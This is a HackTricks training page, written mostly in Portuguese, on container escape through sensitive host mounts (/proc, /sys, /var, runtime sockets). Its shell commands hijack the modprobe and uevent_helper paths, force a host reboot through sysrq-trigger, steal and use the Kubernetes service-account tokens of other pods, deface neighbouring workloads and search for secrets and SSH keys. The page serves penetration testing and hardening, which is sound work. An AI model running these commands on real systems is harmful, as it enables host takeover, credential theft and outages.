# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Host mounts são uma das superfícies práticas de container-escape mais importantes porque frequentemente fazem com que uma visualização de processo cuidadosamente isolada volte a ter visibilidade direta dos recursos do host. Casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, sockets de runtime, estado gerenciado pelo kubelet ou caminhos relacionados a dispositivos podem expor controles do kernel, credenciais, sistemas de arquivos de containers vizinhos e interfaces de gerenciamento em tempo de execução.

Esta página existe separadamente das páginas individuais de proteção porque o modelo de abuso é transversal. Um host mount com permissão de escrita é perigoso em parte por causa dos namespaces de montagem, em parte por causa dos namespaces de usuário, em parte por causa da cobertura por AppArmor ou SELinux, e em parte por causa de qual caminho exato do host foi exposto. Tratá-lo como um tópico próprio torna a superfície de ataque muito mais fácil de raciocinar.

## `/proc` Exposure

procfs contém tanto informações ordinárias de processo quanto interfaces de controle do kernel de alto impacto. Um bind mount como `-v /proc:/host/proc` ou uma visão do container que expõe entradas inesperadas de proc graváveis pode, portanto, levar à divulgação de informações, negação de serviço ou execução direta de código no host.

Caminhos procfs de alto valor incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas procfs de alto valor são visíveis ou graváveis:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses caminhos são interessantes por diferentes motivos. `core_pattern`, `modprobe` e `binfmt_misc` podem tornar-se caminhos de execução de código no host quando graváveis. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes poderosas de reconhecimento para exploração do kernel. `sched_debug` e `mountinfo` revelam contexto de processo, cgroup e sistema de arquivos que podem ajudar a reconstruir o layout do host a partir do interior do container.

O valor prático de cada caminho é diferente, e tratá-los todos como se tivessem o mesmo impacto torna a triagem mais difícil:

- `/proc/sys/kernel/core_pattern`
Se gravável, este é um dos caminhos do procfs de maior impacto porque o kernel executará um pipe handler após um crash. Um container que consiga apontar `core_pattern` para um payload armazenado no seu overlay ou em um caminho montado do host pode frequentemente obter execução de código no host. Veja também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
Esse caminho controla o userspace helper usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se gravável a partir do container e interpretado no contexto do host, pode tornar-se outro primitivo de execução de código no host. É especialmente interessante quando combinado com uma forma de acionar o helper path.
- `/proc/sys/vm/panic_on_oom`
Normalmente não é um primitivo de escape limpo, mas pode converter pressão de memória em negação de serviço em todo o host transformando condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registro for gravável, o atacante pode registrar um handler para um valor magic escolhido e obter execução em contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
Útil para triagem de exploits de kernel. Ajuda a determinar quais subsistemas, mitigations e funcionalidades opcionais do kernel estão habilitadas sem precisar de metadados de pacotes do host.
- `/proc/sysrq-trigger`
Maioritariamente um caminho de negação de serviço, mas um muito sério. Pode reiniciar, causar panic ou de outro modo interromper o host imediatamente.
- `/proc/kmsg`
Revela mensagens do kernel ring buffer. Útil para fingerprinting do host, análise de crashes e, em alguns ambientes, para leak de informações úteis para exploração do kernel.
- `/proc/kallsyms`
Valioso quando legível porque expõe informações de símbolos do kernel exportados e pode ajudar a derrotar suposições de randomização de endereços durante o desenvolvimento de exploits de kernel.
- `/proc/[pid]/mem`
Esta é uma interface direta para a memória de processos. Se o processo alvo for alcançável com as condições necessárias no estilo ptrace, pode permitir ler ou modificar a memória de outro processo. O impacto real depende fortemente de credenciais, `hidepid`, Yama e restrições de ptrace, portanto é um caminho poderoso mas condicional.
- `/proc/kcore`
Expõe uma visão core-image-style da memória do sistema. O arquivo é enorme e difícil de usar, mas se for significativamente legível indica uma superfície de memória do host mal exposta.
- `/proc/kmem` and `/proc/mem`
Historicamente interfaces de memória bruta de alto impacto. Em muitos sistemas modernos estão desabilitadas ou fortemente restringidas, mas se presentes e utilizáveis devem ser tratadas como achados críticos.
- `/proc/sched_debug`
Leaks informações de escalonamento e tarefas que podem expor identidades de processos do host mesmo quando outras visões de processo parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
Extremamente útil para reconstruir onde o container realmente reside no host, quais caminhos são overlay-backed, e se um writable mount corresponde ao conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou detalhes do overlay forem legíveis, use-os para recuperar o caminho no host do sistema de arquivos do container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque várias host-execution tricks exigem converter um caminho dentro do container para o caminho correspondente do ponto de vista do host.

### Exemplo completo: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` for gravável a partir do container e o helper path for interpretado no contexto do host, ele pode ser redirecionado para um attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
O gatilho exato depende do alvo e do comportamento do kernel, mas o ponto importante é que um helper path gravável pode redirecionar uma futura invocação de helper do kernel para conteúdo no host-path controlado pelo atacante.

### Exemplo completo: reconhecimento do kernel com `kallsyms`, `kmsg` e `config.gz`

Se o objetivo for avaliação da possibilidade de exploração em vez de fuga imediata:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Esses comandos ajudam a responder se informações úteis de símbolos estão visíveis, se mensagens recentes do kernel revelam estado interessante e quais recursos ou mitigações do kernel estão compilados. O impacto normalmente não é uma fuga direta, mas pode reduzir drasticamente a triagem de vulnerabilidades do kernel.

### Exemplo completo: SysRq Host Reboot

Se `/proc/sysrq-trigger` for gravável e estiver acessível a partir do host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é a reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais séria do que a divulgação de informações.

## `/sys` Exposição

sysfs expõe grandes quantidades de estado do kernel e dos dispositivos. Alguns caminhos do sysfs são principalmente úteis para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento de dispositivos, a configuração de módulos de segurança ou o estado do firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos importam por razões diferentes. `/sys/class/thermal` pode influenciar o comportamento de gerenciamento térmico e, portanto, a estabilidade do host em ambientes mal expostos. `/sys/kernel/vmcoreinfo` pode leak crash-dump e kernel-layout information que ajudam no fingerprinting de host em baixo nível. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules, então acesso inesperado ali pode expor ou alterar estado relacionado a MAC. Caminhos de variáveis EFI podem afetar configurações de boot suportadas por firmware, tornando-os muito mais sérios do que arquivos de configuração comuns. `debugfs` sob `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface orientada a desenvolvedores com expectativas de segurança muito menores do que as APIs do kernel voltadas para produção e hardening.

Comandos úteis para revisar esses caminhos são:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
O que torna esses comandos interessantes:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` for gravável, o kernel pode executar um helper controlado pelo atacante quando um `uevent` for disparado:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
A razão pela qual isso funciona é que o helper path é interpretado do ponto de vista do host. Uma vez acionado, o helper é executado no contexto do host em vez de dentro do container atual.

## Exposição de `/var`

Montar o `/var` do host em um container é frequentemente subestimado porque não parece tão dramático quanto montar `/`. Na prática, pode ser suficiente para alcançar runtime sockets, diretórios de snapshot de container, volumes de pods gerenciados pelo kubelet, projected service-account tokens e sistemas de arquivos de aplicações vizinhas. Em nós modernos, `/var` costuma ser onde o estado de container mais interessante, do ponto de vista operacional, realmente vive.

### Exemplo Kubernetes

Um pod com `hostPath: /var` frequentemente pode ler os projected tokens de outros pods e o conteúdo de snapshot do overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicação sem importância ou credenciais de cluster de alto impacto. Um service-account token legível pode imediatamente transformar local code execution em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele pode alcançar em vez de parar na token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser muito maior do que o acesso local ao nó. Um token com RBAC amplo pode transformar um `/var` montado em um comprometimento de todo o cluster.

### Docker e containerd — Exemplo

Em hosts Docker, os dados relevantes costumam estar em `/var/lib/docker`, enquanto em nós Kubernetes com containerd eles podem estar em `/var/lib/containerd` ou em caminhos específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expuser conteúdos de snapshot graváveis de outra workload, o atacante pode alterar arquivos da aplicação, plantar conteúdo web ou modificar scripts de inicialização sem tocar na configuração atual do container.

Ideias concretas de abuso quando conteúdo de snapshot gravável for encontrado:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais famílias de impacto de um `/var` montado: adulteração de aplicações, recuperação de segredos e movimento lateral para cargas de trabalho vizinhas.

## Sockets de runtime

Montagens sensíveis no host frequentemente incluem sockets de runtime em vez de diretórios completos. Eles são tão importantes que merecem repetição explícita aqui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Veja [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para fluxos de exploração completos assim que um desses sockets for montado.

Como um padrão rápido de interação inicial:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se uma dessas tiver sucesso, o caminho de "mounted socket" para "start a more privileged sibling container" normalmente é muito mais curto do que qualquer kernel breakout path.

## Mount-Related CVEs

Host mounts também se cruzam com vulnerabilidades de runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` em `runc`, onde um leaked descritor de arquivo de diretório poderia colocar o working directory no sistema de arquivos do host.
- `CVE-2024-23651` e `CVE-2024-23653` no BuildKit, onde OverlayFS copy-up races poderiam produzir gravações em caminhos do host durante builds.
- `CVE-2024-1753` no Buildah e Podman build flows, onde bind mounts forjados durante o build poderiam expor `/` com permissão de leitura-escrita.
- `CVE-2024-40635` no containerd, onde um grande valor `User` poderia transbordar e resultar em comportamento de UID 0.

Esses CVEs importam aqui porque mostram que o tratamento de mounts não é apenas sobre a configuração do operador. O runtime em si também pode introduzir condições de escape dirigidas por mounts.

## Checks

Use estes comandos para localizar rapidamente as exposições de mount de maior valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
O que é interessante aqui:

- root do host, `/proc`, `/sys`, `/var` e sockets de runtime são todos achados de alta prioridade.
- Entradas graváveis em proc/sys frequentemente significam que a montagem está expondo controles globais do kernel do host em vez de uma visão segura do container.
- Caminhos montados em `/var` merecem revisão de credenciais e das cargas de trabalho vizinhas, não apenas revisão do sistema de arquivos.
{{#include ../../../banners/hacktricks-training.md}}
